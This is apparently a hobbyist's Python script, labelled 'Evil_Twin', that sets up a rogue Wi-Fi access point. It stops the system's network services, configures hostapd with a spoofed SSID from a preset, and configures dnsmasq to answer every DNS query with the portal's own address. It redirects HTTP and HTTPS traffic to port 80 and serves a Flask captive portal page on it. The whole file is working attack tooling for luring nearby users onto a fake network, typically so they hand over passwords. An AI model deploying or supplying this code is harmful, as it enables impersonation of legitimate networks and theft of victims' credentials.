#IMPORTS 
import textwrap
import os 
import time 
import sys
import subprocess
import threading
from flask import Flask, render_template
from EvilTwin_info import WIFI_PRESETS, ACTIVE_PRESET, WLAN
preset = WIFI_PRESETS[ACTIVE_PRESET]


#For comands like stop procesess  -- "systemctl", "stop", "NetworkManager  
def cmd(comand, ignore_error = False): # ignore_error so the script dont fail if we are trying to turn off a function that isnt even on
    result = subprocess.run(comand, capture_output=True, text=True)
    if result.returncode !=0 and not ignore_error:
          print(f"ERROR: {result.stderr.strip()}")
          sys.exit(1)
    return result     

#Configruration
IFACE = WLAN
PORTAL_IP = "192.168.4.1"
WIFI_SSID = preset["ssid"]

#Step 1 stop all services
def stoping_services():
    print("Stoping all services...")
    cmd(["systemctl", "stop", "wpa_supplicant"], ignore_error=True)
    cmd(["systemctl", "disable", "wpa_supplicant"], ignore_error=True) # to turn off wpa_suplicatnt
    cmd(["systemctl", "stop", "NetworkManager"], ignore_error=True)
    cmd(["systemctl", "stop", "hostapd"], ignore_error=True)
    cmd(["systemctl", "stop", "dnsmasq"], ignore_error=True)
    print("Step 1 DONE... all services where stoped")


# Step 2 configuring interfaces
def configuring_interfaces():
     print("Configureting intarfeces")
     cmd (["ip", "link", "set", IFACE, "up"], ignore_error=True) # Turn on InterFace
     cmd (["ip", "addr", "flush", "dev", IFACE], ignore_error=True) # Flush InterFace
     cmd(["ip", "addr", "add", f"{PORTAL_IP}/24", "dev", IFACE], ignore_error=True) # to add IP to InterFace
     print("Step 2 DONE ... Configureting intarfeces was successful")


#Step 3 Rewriting config files (Configuring HOSTAPD and DNSMASQ)
config_hostapd = textwrap.dedent (f"""\
     interface={IFACE}
     driver=nl80211
     ssid={WIFI_SSID}
     hw_mode=g
     channel=6
     wmm_enabled=0
     auth_algs=1
     ignore_broadcast_ssid=0
""")

def configurating_hostapd():
     os.makedirs("/etc/hostapd", exist_ok=True)
     with open("/etc/hostapd/hostapd.conf", "w") as f:
          f.write(config_hostapd)

config_dnsmasq = textwrap.dedent(f"""\
     interface={IFACE}
     bind-interfaces
     dhcp-range=192.168.4.10,192.168.4.100,255.255.255.0,12h
     dhcp-option=3,192.168.4.1
     dhcp-option=6,192.168.4.1
     address=/#/192.168.4.1
     no-resolv
 """)

def configurating_dnsmasq():
     with open("/etc/dnsmasq.conf", "w") as f:
          f.write(config_dnsmasq)

def starting_services():
     #Useing definicions to configure.
     configurating_hostapd()
     configurating_dnsmasq()
     time.sleep(1)
     #Starting the servecises
     cmd(["systemctl", "unmask", "hostapd"], ignore_error=True) 
     cmd(["systemctl", "start", "hostapd"])
     time.sleep(2)
     cmd(["systemctl", "start", "dnsmasq"])

     print("All services are running DNSMASQ ... ON HOSTAPD... ON")
#100% works 

def setup_iptables():
    print("Setting up iptables rules...")
    # This will clean the iptable
    cmd(["iptables", "-t", "nat", "-F"], ignore_error=True)

    #HTTP to port 80
    cmd(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", IFACE,
         "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"])
     
     #HTTPS to port 80
    cmd(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", IFACE,
         "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "80"])

base_dir = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__, template_folder=os.path.join(base_dir, "templates"))

@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def captive_portal(path):
    return render_template(preset["portal"])

def start_portal():
     print("Starting web server on port 80...")
     threading.Thread(target=lambda: app.run(host="0.0.0.0", port=80, threaded=True), daemon=True).start()


def main():
    stoping_services()
    configuring_interfaces()
    starting_services()
    setup_iptables()
    print("Starting Evil_Twin.py Portal")
    start_portal()

if __name__ == "__main__":
    main()

#Captive portal is working...